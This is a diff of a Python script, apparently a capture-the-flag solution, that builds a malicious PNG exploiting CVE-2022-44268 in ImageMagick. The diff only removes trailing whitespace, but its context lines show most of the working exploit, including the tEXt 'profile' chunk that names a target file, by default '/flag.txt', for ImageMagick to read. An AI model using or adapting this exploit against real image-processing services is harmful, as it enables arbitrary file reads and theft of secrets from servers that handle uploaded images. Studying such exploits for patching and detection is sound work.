@@ -48,10 +48,10 @@ def create_malicious_png(target_file="/flag.txt"):
     Create a malicious PNG that exploits CVE-2022-44268
     to read arbitrary files via ImageMagick
     """
-    
+
     # PNG signature
     png_signature = b'\x89PNG\r\n\x1a\n'
-    
+
     # IHDR chunk (image header) - 1x1 pixel RGB image
     width = 1
     height = 1
@@ -60,13 +60,13 @@ def create_malicious_png(target_file="/flag.txt"):
     compression = 0
     filter_method = 0
     interlace = 0
-    
-    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 
+
+    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type,
                            compression, filter_method, interlace)
     ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xffffffff
     ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' \
 			+ ihdr_data + struct.pack('>I', ihdr_crc)
-    
+
     # tEXt chunk with profile keyword pointing to target file
     # This is the key to the exploit - ImageMagick will try to read this as a file path
     txt_keyword = b'profile'
@@ -75,7 +75,7 @@ def create_malicious_png(target_file="/flag.txt"):
     txt_crc = zlib.crc32(b'tEXt' + txt_data) & 0xffffffff
     txt_chunk = struct.pack('>I', len(txt_data)) + b'tEXt' \
 			+ txt_data + struct.pack('>I', txt_crc)
-    
+
     # IDAT chunk (image data) - minimal data for 1x1 RGB pixel
     # Raw image data: one white pixel (RGB: 255,255,255)
     raw_data = b'\x00\xff\xff\xff'  # Filter byte + RGB values
@@ -83,14 +83,14 @@ def create_malicious_png(target_file="/flag.txt"):
     idat_crc = zlib.crc32(b'IDAT' + compressed_data) & 0xffffffff
     idat_chunk = struct.pack('>I', len(compressed_data)) + b'IDAT' \
 			+ compressed_data + struct.pack('>I', idat_crc)
-    
+
     # IEND chunk (end of image)
     iend_crc = zlib.crc32(b'IEND') & 0xffffffff
     iend_chunk = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
-    
+
     # Combine all chunks
     png_data = png_signature + ihdr_chunk + txt_chunk + idat_chunk + iend_chunk
-    
+
     return png_data
 
 # Generate the exploit
